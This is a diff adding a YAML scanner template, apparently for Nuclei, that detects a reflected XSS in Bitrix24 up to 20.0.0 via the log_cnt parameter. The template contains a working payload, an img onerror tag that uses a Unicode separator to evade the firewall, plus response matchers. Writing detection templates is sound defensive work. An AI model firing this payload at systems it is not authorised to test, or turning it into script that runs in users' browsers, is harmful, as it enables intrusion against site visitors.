@@ -1,0 +1,27 @@
+id: bitrix-getmessage-xss
+
+info:
+  name: Bitrix24 <=20.0.0 - XSS on endpoint get_message_2.php
+  author: gtrrnr
+  severity: medium
+  description: The Web Application Firewall in Bitrix24 up to and including 20.0.0 allows XSS via the log_cnt parameter to the /components/bitrix/socialnetwork.events_dyn/get_message_2.php URI.
+  reference:
+    - https://github.com/cr1f/writeups/blob/main/attacking_bitrix.pdf
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
+    cvss-score: 4.3
+    cwe-id: CWE-79
+  tags: xss,bitrix
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror%E2%80%A9=alert(document.domain)%20src=1>%20METASCAN'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<img onerror =alert(document.domain) src=1> METASCAN")'
+          - 'contains(body, "LOG_CNT")'
+        condition: and
